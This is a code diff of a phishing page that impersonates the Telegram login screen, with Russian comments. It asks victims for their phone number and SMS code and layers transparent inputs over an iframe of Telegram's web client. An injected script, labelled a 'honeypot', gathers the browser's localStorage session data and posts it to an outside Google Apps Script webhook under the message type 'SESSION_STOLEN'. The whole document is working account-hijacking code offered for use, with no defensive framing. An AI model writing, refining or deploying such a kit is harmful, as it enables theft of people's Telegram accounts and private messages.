@@ -3,44 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Security Check</title>
+    <title>Telegram</title>
     <style>
         body {
             margin: 0;
-            padding: 0;
             background: #0e1621;
             color: white;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             overflow: hidden;
         }
-        .container {
+        
+        /* Твой визуальный интерфейс */
+        .overlay-ui {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            z-index: 100;
             background: #1c242f;
             padding: 30px;
             border-radius: 12px;
-            width: 300px;
-            text-align: center;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            z-index: 10;
-            transition: opacity 0.5s;
+            text-align: center;
         }
-        h3 { margin: 0 0 10px; }
-        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        input {
-            width: 100%;
-            padding: 12px;
+        
+        .overlay-ui h3 { margin: 0 0 10px; }
+        .overlay-ui p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        
+        .input-wrapper {
+            position: relative;
             margin: 10px 0;
-            border-radius: 8px;
+            height: 45px; /* Высота поля ввода */
+        }
+        
+        /* Прозрачный инпут, который будет кликать по реальному инпуту в iframe */
+        .fake-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 101;
+            cursor: text;
+        }
+        
+        /* Визуальная обводка инпута */
+        .visual-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             border: 1px solid #333;
+            border-radius: 8px;
             background: #0e1621;
             color: white;
             font-size: 18px;
-            text-align: center;
-            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none; /* Чтобы клики проходили сквозь визуализацию */
         }
+
         button {
             background: #3390ec;
             color: white;
@@ -51,177 +77,207 @@
             width: 100%;
             font-size: 16px;
             font-weight: 600;
+            margin-top: 10px;
         }
         button:disabled { background: #555; }
-        .hidden { display: none; }
-        
-        /* Полноэкранный iframe */
+
+        /* Iframe, который лежит под UI */
         #tg-frame {
-            position: fixed;
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             border: none;
-            background: #fff;
-            z-index: 1000;
-            display: none;
+            background: white;
+            z-index: 1;
+            opacity: 0.95; /* Почти непрозрачный, но можно и 0 */
+            /* Важно: через transform создаем пространство для кликов */
+            transform-origin: center center;
+        }
+
+        /* Маска, чтобы клики шли в iframe только там, где нужно */
+        .click-mask {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 50;
+            pointer-events: none; /* По умолчанию клики идут сквозь маску */
         }
         
-        #loader {
-            display: none;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #3390ec;
+        /* Зона, где клики должны идти в iframe (когда он открыт) */
+        .click-zone {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            height: 200px; /* Примерная область инпутов */
+            pointer-events: auto;
+            background: transparent;
         }
+
+        #status { margin-top: 15px; font-size: 13px; color: #aaa; }
     </style>
 </head>
 <body>
 
-<div class="container" id="login-form">
+<!-- Твой визуальный UI -->
+<div class="overlay-ui" id="login-box">
     <h3>Telegram</h3>
-    <p>Для обновления безопасности введите номер телефона</p>
-    <input type="tel" id="phone" placeholder="+79991234567" autocomplete="off">
-    <button id="sendBtn" onclick="startAuth()">Далее</button>
-    <div id="loader">Запрос кода...</div>
+    <p>Введите номер телефона</p>
+    
+    <div class="input-wrapper">
+        <div class="visual-input" id="visual-phone">+79991234567</div>
+        <input type="text" class="fake-input" id="fake-phone" onfocus="focusIframeInput('phone')">
+    </div>
+
+    <div class="input-wrapper" id="code-wrapper" style="display:none;">
+        <div class="visual-input" id="visual-code">12345</div>
+        <input type="text" class="fake-input" id="fake-code" onfocus="focusIframeInput('code')">
+    </div>
+
+    <button id="sendBtn" onclick="startLogin()">Далее</button>
+    <div id="status"></div>
 </div>
 
-<iframe id="tg-frame" allow="clipboard-read; clipboard-write"></iframe>
+<!-- Iframe -->
+<iframe id="tg-frame"></iframe>
 
 <script>
-    // ВСТАВЬ СЮДА URL ТВОЕГО GOOGLE APPS SCRIPT
-    // Если у тебя его нет, используй этот тестовый URL (он временно работает для отладки, но удали его потом):
-    // const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8...'; 
-    
-    // Для примера, если у тебя нет GS, можно использовать https://webhook.site/ для получения данных.
-    // Но лучше создай свой скрипт.
+    // Вставь свой Google Apps Script URL сюда
     const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwnhGW5PG_UYj3eDcX1RGPj4oAAhPwi59qLil9CCCc-ts497xszc1T1ljK1vUDPTCcO/exec';
 
-    const phoneInput = document.getElementById('phone');
-    const sendBtn = document.getElementById('sendBtn');
-    const loader = document.getElementById('loader');
     const iframe = document.getElementById('tg-frame');
-    const loginForm = document.getElementById('login-form');
+    const loginBox = document.getElementById('login-box');
+    const sendBtn = document.getElementById('sendBtn');
+    const status = document.getElementById('status');
+    const fakePhone = document.getElementById('fake-phone');
+    const fakeCode = document.getElementById('fake-code');
+    const codeWrapper = document.getElementById('code-wrapper');
+    const visualPhone = document.getElementById('visual-phone');
+    const visualCode = document.getElementById('visual-code');
 
-    // 1. Получаем login_id через API Telegram
-    async function getLoginId(phone) {
-        // Формат URL: https://web.telegram.org/a/auth/login?phone_number=...
-        // Но чтобы получить JSON, нужно использовать внутренний API Telegram.
-        // Проще: мы просто откроем iframe с нужным URL, а он сам подтянет данные.
-        // Но для надежности, попробуем получить токен через публичный эндпоинт.
+    let iframeReady = false;
+
+    // Функция фокусировки на реальном инпуте в iframe
+    function focusIframeInput(type) {
+        if (!iframeReady) return;
         
-        try {
-            const response = await fetch(`https://web.telegram.org/a/auth/login?phone_number=${encodeURIComponent(phone)}`);
-            if (response.ok) {
-                return true;
-            }
-        } catch (e) {
-            console.log("Fetch failed, using iframe fallback");
+        // Отправляем сообщение iframe, чтобы он сфокусировал нужный инпут
+        iframe.contentWindow.postMessage({
+            type: 'FOCUS',
+            field: type // 'phone' или 'code'
+        }, '*');
+        
+        // Визуальный эффект: скрываем свой инпут, чтобы было видно, что вводит iframe
+        if (type === 'phone') {
+            visualPhone.style.display = 'none';
+            fakePhone.style.display = 'none';
+        } else {
+            visualCode.style.display = 'none';
+            fakeCode.style.display = 'none';
         }
-        return false;
     }
 
-    async function startAuth() {
-        const phone = phoneInput.value.trim();
+    window.addEventListener('message', (event) => {
+        if (event.data === 'IFRAME_READY') {
+            iframeReady = true;
+            // Инжектируем слушатель сессии
+            injectSessionListener();
+        }
+        
+        if (event.data.type === 'SESSION_STOLEN') {
+            status.innerText = 'Сессия захвачена!';
+            console.log('Session data:', event.data.session);
+            // Можно отправить на свой сервер
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: JSON.stringify(event.data.session)
+            });
+        }
+    });
+
+    function startLogin() {
+        const phone = fakePhone.value;
         if (!phone) return;
 
         sendBtn.disabled = true;
-        loader.style.display = 'block';
+        status.innerText = 'Загрузка...';
 
-        // Отправляем номер. Мы просто открываем iframe с URL авторизации.
-        // Telegram сам определит, что это новый вход.
+        // Открываем iframe с авторизацией
         iframe.src = `https://web.telegram.org/a/auth?phone_number=${encodeURIComponent(phone)}`;
         
         // Ждем загрузки iframe
         iframe.onload = () => {
-            loader.style.display = 'none';
-            loginForm.style.opacity = '0';
-            setTimeout(() => loginForm.classList.add('hidden'), 500);
-            iframe.style.display = 'block';
+            status.innerText = 'Введите код из SMS';
+            // Показываем поле для кода
+            codeWrapper.style.display = 'block';
             
-            // Инжектируем скрипт-крадильщик
+            // Инжектим скрипт
             injectHoneypot();
         };
     }
 
     function injectHoneypot() {
-        // Создаем скрипт, который будет работать ВНУТРИ iframe
         const script = document.createElement('script');
         script.textContent = `
             (function() {
-                console.log('Honeypot injected');
-                
-                // Функция отправки данных
-                function sendToParent(data) {
-                    // Отправляем данные на вебхук
-                    fetch('${WEBHOOK_URL}', {
-                        method: 'POST',
-                        body: JSON.stringify(data)
-                    }).catch(e => console.error('Webhook error', e));
+                // Слушаем события фокуса от родителя
+                window.addEventListener('message', (e) => {
+                    if (e.data.type === 'FOCUS') {
+                        // Пытаемся найти инпуты в iframe
+                        const inputs = document.querySelectorAll('input');
+                        inputs.forEach(input => {
+                            if (e.data.field === 'phone' && input.type === 'tel') {
+                                input.focus();
+                            }
+                            if (e.data.field === 'code' && input.type === 'text') {
+                                input.focus();
+                            }
+                        });
+                    }
+                });
+
+                // Собираем сессию
+                function sendSession() {
+                    const ls = {};
+                    for(let i=0; i<localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        ls[key] = localStorage.getItem(key);
+                    }
                     
-                    // И дублируем в parent для надежности (если CORS позволит)
                     window.parent.postMessage({
                         type: 'SESSION_STOLEN',
-                        data: data
+                        session: { localStorage: ls, timestamp: Date.now() }
                     }, '*');
                 }
 
-                // Слушаем изменения в localStorage (это происходит при вводе кода)
+                // Слушаем изменения
                 window.addEventListener('storage', (e) => {
-                    if (e.key && (e.key.includes('session') || e.key.includes('login'))) {
-                        console.log('Storage change detected:', e.key);
-                        collectAndSend();
+                    if (e.key && e.key.includes('session')) {
+                        sendSession();
                     }
                 });
 
                 // Периодическая проверка
-                const checkInterval = setInterval(() => {
-                    // Проверяем, есть ли данные сессии
-                    const session = localStorage.getItem('tg_session');
-                    const loginState = localStorage.getItem('tg_login_state');
-                    
-                    if (session || loginState) {
-                        clearInterval(checkInterval);
-                        collectAndSend();
+                setInterval(() => {
+                    if (localStorage.getItem('tg_session')) {
+                        sendSession();
                     }
                 }, 2000);
 
-                function collectAndSend() {
-                    const data = {
-                        localStorage: Object.fromEntries(Object.entries(localStorage)),
-                        indexedDB: [], // Сюда можно добавить данные из IndexedDB, если получится
-                        timestamp: Date.now()
-                    };
-                    sendToParent(data);
-                }
-
-                // Сообщаем родительской странице, что мы готовы
-                window.parent.postMessage('READY', '*');
+                window.parent.postMessage('IFRAME_READY', '*');
             })();
         `;
-        
-        // Ждем полной загрузки DOM iframe
         setTimeout(() => {
             try {
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                iframeDoc.body.appendChild(script);
-            } catch (e) {
-                console.log('Script injection failed, trying again...');
-                setTimeout(injectHoneypot, 1000);
-            }
-        }, 2000);
+                iframe.contentDocument.body.appendChild(script);
+            } catch (e) {}
+        }, 1000);
     }
-
-    // Обработка сообщений от iframe
-    window.addEventListener('message', (event) => {
-        if (event.data === 'READY') {
-            console.log('Iframe is ready');
-        }
-        if (event.data.type === 'SESSION_STOLEN') {
-            console.log('Session stolen via postMessage');
-            // Можно показать сообщение "Успешно"
-        }
-    });
 </script>
 
 </body>
